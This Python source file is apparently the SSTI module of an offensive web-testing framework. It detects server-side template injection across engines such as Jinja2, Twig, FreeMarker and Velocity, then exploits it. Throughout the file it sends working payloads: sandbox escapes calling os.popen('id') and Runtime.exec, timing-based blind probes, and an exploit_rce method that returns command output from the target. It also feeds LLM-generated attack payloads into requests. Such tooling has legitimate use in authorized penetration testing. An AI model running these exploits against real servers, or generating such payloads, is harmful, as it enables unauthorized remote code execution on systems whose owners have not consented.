#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - SSTI Module
Server-Side Template Injection detection and exploitation
"""

from config import Payloads, Colors


class SSTIModule:
    """SSTI Testing Module"""

    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "SSTI"

        # Template engine indicators
        self.template_engines = {
            "jinja2": [
                "jinja2",
                "jinja2.exceptions",
                "undefinederror",
            ],
            "django": [
                "django.template",
                "template syntax error",
                "django",
            ],
            "twig": [
                "twig",
                "twig_error",
            ],
            "smarty": [
                "smarty",
                "smarty error",
            ],
            "freemarker": [
                "freemarker",
                "freemarker.template",
            ],
            "velocity": [
                "velocity",
                "org.apache.velocity",
            ],
            "thymeleaf": [
                "thymeleaf",
                "thymeleaferrors",
            ],
            "handlebars": [
                "handlebars",
                "handlebars error",
            ],
            "razor": [
                "razor",
                "aspnet",
            ],
        }

    def test(self, url: str, method: str, param: str, value: str):
        """Test for SSTI"""
        # Test basic SSTI
        self._test_basic(url, method, param, value)

        # Test for specific engines
        self._test_engines(url, method, param, value)

        # Test additional template engines
        self._test_additional_engines(url, method, param, value)

        # Test sandbox escape
        self._test_sandbox_escape(url, method, param, value)

        # Test blind SSTI
        self._test_blind_ssti(url, method, param, value)

        # LLM-generated adaptive SSTI payloads
        self._test_llm_payloads(url, method, param, value)

    def _test_llm_payloads(self, url: str, method: str, param: str, value: str):
        """Test with LLM-generated template injection payloads.

        Uses Qwen2.5-7B context-aware payload generation when
        ``--local-llm`` is active.
        """
        ai = getattr(self.engine, "ai", None)
        if ai is None:
            return
        llm_payloads = ai.get_llm_payloads("ssti", param)
        if not llm_payloads:
            return

        for payload in llm_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                resp_text = response.text
                # Check for math eval (common SSTI confirmation)
                if "49" in resp_text and "{{7*7}}" not in resp_text:
                    from core.engine import Finding

                    finding = Finding(
                        technique="SSTI (AI-generated)",
                        url=url,
                        severity="HIGH",
                        confidence=0.80,
                        param=param,
                        payload=payload,
                        evidence="AI payload triggered template expression evaluation",
                    )
                    self.engine.add_finding(finding)
                    return
                # Check for engine error messages
                resp_lower = resp_text.lower()
                for engine_name, signatures in self.template_engines.items():
                    for sig in signatures:
                        if sig in resp_lower:
                            from core.engine import Finding

                            finding = Finding(
                                technique=f"SSTI - AI-generated ({engine_name})",
                                url=url,
                                severity="HIGH",
                                confidence=0.75,
                                param=param,
                                payload=payload,
                                evidence=f"AI payload triggered {engine_name} error",
                            )
                            self.engine.add_finding(finding)
                            return
            except Exception:
                continue

    def _test_additional_engines(self, url: str, method: str, param: str, value: str):
        """Test additional template engines (Pebble, Smarty, EJS, Handlebars)"""
        engine_payloads = {
            "pebble": ('{{ "test".toUpperCase() }}', "TEST"),
            "smarty": ("{$smarty.version}", "smarty"),
            "ejs": ("<%= 7*7 %>", "49"),
            "handlebars": ("{{this}}", "[object"),
        }
        for engine_name, (payload, expected) in engine_payloads.items():
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                if expected.lower() in response.text.lower():
                    from core.engine import Finding

                    finding = Finding(
                        technique=f"SSTI ({engine_name.title()})",
                        url=url,
                        severity="HIGH",
                        confidence=0.85,
                        param=param,
                        payload=payload,
                        evidence=f"Engine {engine_name} detected: '{expected}' found",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def _test_sandbox_escape(self, url: str, method: str, param: str, value: str):
        """Test SSTI sandbox escape payloads"""
        escape_payloads = [
            ("{{ ''.__class__.__mro__[2].__subclasses__() }}", "jinja2", "subprocess"),
            ("{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", "jinja2", "uid="),
            ("${T(java.lang.Runtime).getRuntime().exec('id')}", "spring_el", "uid="),
        ]
        for payload, eng, indicator in escape_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                if indicator.lower() in response.text.lower():
                    from core.engine import Finding

                    finding = Finding(
                        technique=f"SSTI (Sandbox Escape - {eng.title()})",
                        url=url,
                        severity="CRITICAL",
                        confidence=0.95,
                        param=param,
                        payload=payload,
                        evidence=f"Sandbox escape: {indicator} found",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def _test_blind_ssti(self, url: str, method: str, param: str, value: str):
        """Test blind SSTI via timing"""
        import time

        blind_payloads = ["{{ range(10000000)|list }}", "${T(java.lang.Thread).sleep(5000)}"]
        try:
            start = time.time()
            self.requester.request(url, method, data={param: value})
            baseline = time.time() - start
        except Exception:
            baseline = 0
        for payload in blind_payloads:
            try:
                start = time.time()
                self.requester.request(url, method, data={param: payload})
                elapsed = time.time() - start
                if elapsed > baseline + 4.0 and elapsed >= 4.5:
                    from core.engine import Finding

                    finding = Finding(
                        technique="SSTI (Blind / Time-based)",
                        url=url,
                        severity="HIGH",
                        confidence=0.7,
                        param=param,
                        payload=payload,
                        evidence=f"Time delay: {elapsed:.1f}s vs baseline {baseline:.1f}s",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def test_url(self, url: str):
        """Test URL for SSTI"""

    def _test_basic(self, url: str, method: str, param: str, value: str):
        """Test for basic SSTI"""
        payloads = Payloads.SSTI_PAYLOADS

        # Use multiple math expressions to confirm evaluation
        math_tests = [
            ("{{7*7}}", "49"),
            ("{{7*191}}", "1337"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
        ]

        # First try math expression tests with confirmation
        for payload, expected in math_tests:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                response_text = response.text

                if expected in response_text:
                    # Confirm by checking that the raw template syntax is NOT in response
                    # (if '{{7*7}}' is echoed back, it wasn't evaluated)
                    # Also check for HTML-encoded variants of the payload
                    import html

                    payload_encoded = html.escape(payload)
                    if payload not in response_text and payload_encoded not in response_text:
                        # Dual-check: send a DIFFERENT math expression to confirm
                        if "{{" in payload:
                            confirm_payload = "{{3*11}}"
                        elif "${" in payload:
                            confirm_payload = "${3*11}"
                        elif "<%=" in payload:
                            confirm_payload = "<%= 3*11 %>"
                        else:
                            confirm_payload = None

                        if confirm_payload:
                            confirm_expected = "33"
                            try:
                                confirm_data = {param: confirm_payload}
                                confirm_response = self.requester.request(url, method, data=confirm_data)
                                if not confirm_response:
                                    continue
                                confirm_text = confirm_response.text
                                confirm_encoded = html.escape(confirm_payload)
                                if confirm_expected not in confirm_text:
                                    continue
                                if confirm_payload in confirm_text or confirm_encoded in confirm_text:
                                    continue
                            except Exception:
                                continue

                        from core.engine import Finding

                        finding = Finding(
                            technique="SSTI (Expression Evaluation)",
                            url=url,
                            severity="CRITICAL",
                            confidence=0.95,
                            param=param,
                            payload=payload,
                            evidence=f"Template expression evaluated: {payload}={expected}",
                        )
                        self.engine.add_finding(finding)
                        return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'SSTI test error: {e}')}")

        # Then try payloads that trigger template engine errors
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                response_text = response.text

                # Check for template engine errors
                for engine, indicators in self.template_engines.items():
                    for indicator in indicators:
                        if indicator.lower() in response_text.lower():
                            from core.engine import Finding

                            finding = Finding(
                                technique=f"SSTI ({engine.upper()})",
                                url=url,
                                severity="CRITICAL",
                                confidence=0.9,
                                param=param,
                                payload=payload,
                                evidence=f"Template engine error: {engine}",
                            )
                            self.engine.add_finding(finding)
                            return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'SSTI test error: {e}')}")

    def _test_engines(self, url: str, method: str, param: str, value: str):
        """Test for specific template engines"""
        engine_tests = {
            "jinja2": [
                "{{7*7}}",
                "{{config}}",
                "{{self}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
            ],
            "django": [
                "{%% raw %%}{{7*7}}{%% endraw %%}",
                "{{request}}",
            ],
            "twig": [
                "{{7*7}}",
                '{{_self.env.registerUndefinedFilterCallback("exec")}}',
            ],
            "freemarker": [
                "${7*7}",
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
            ],
            "velocity": [
                "#set($x=7*7)$x",
            ],
        }

        for engine, payloads in engine_tests.items():
            for payload in payloads:
                try:
                    data = {param: payload}
                    response = self.requester.request(url, method, data=data)

                    if not response:
                        continue

                    # Check for engine-specific responses
                    if "49" in response.text and payload not in response.text:
                        from core.engine import Finding

                        finding = Finding(
                            technique=f"SSTI ({engine.capitalize()})",
                            url=url,
                            severity="CRITICAL",
                            confidence=0.9,
                            param=param,
                            payload=payload,
                            evidence=f"{engine.capitalize()} template engine detected",
                        )
                        self.engine.add_finding(finding)
                        return

                except Exception as e:
                    if self.engine.config.get("verbose"):
                        print(f"{Colors.error(f'SSTI engine test error: {e}')}")

    def exploit_rce(self, url: str, param: str, engine: str = "jinja2") -> str:
        """Generate RCE payload for SSTI"""
        if engine == "jinja2":
            payloads = [
                "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__['__import__']('os').popen('id').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            ]
        elif engine == "twig":
            payloads = [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            ]
        elif engine == "freemarker":
            payloads = [
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
            ]
        else:
            payloads = []

        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, "POST", data=data)

                if response:
                    return response.text
            except Exception as e:
                print(f"{Colors.error(f'SSTI RCE error: {e}')}")

        return None
